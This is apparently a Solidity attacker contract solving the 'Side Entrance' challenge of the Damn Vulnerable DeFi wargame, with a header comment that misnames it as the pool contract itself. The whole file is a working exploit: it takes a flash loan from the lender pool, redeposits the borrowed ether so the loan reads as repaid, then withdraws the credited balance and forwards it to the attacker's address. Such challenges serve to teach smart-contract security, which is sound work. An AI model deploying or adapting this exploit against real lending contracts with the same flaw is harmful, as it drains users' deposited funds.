// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver {
    using Address for address payable;

    address private _vulnerableContract;
    address private _attacker;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    constructor(address vulnerableContract) {
        _vulnerableContract = vulnerableContract;
        _attacker = msg.sender;
    }

    function execute() external payable {
        require(msg.sender == _vulnerableContract, "don't be too greddy");
        ISideEntranceLenderPool(_vulnerableContract).deposit{
            value: msg.value
        }();
    }

    function flashLoan(uint256 amount) external {
        ISideEntranceLenderPool(_vulnerableContract).flashLoan(amount);
    }

    function withdrawProfit() external payable {
        require(msg.sender == _attacker, "don't be too sneaky");
        ISideEntranceLenderPool(_vulnerableContract).withdraw();
    }

    receive() external payable {
        payable(_attacker).sendValue(address(this).balance);
    }

    fallback() external payable {
        payable(_attacker).sendValue(address(this).balance);
    }
}
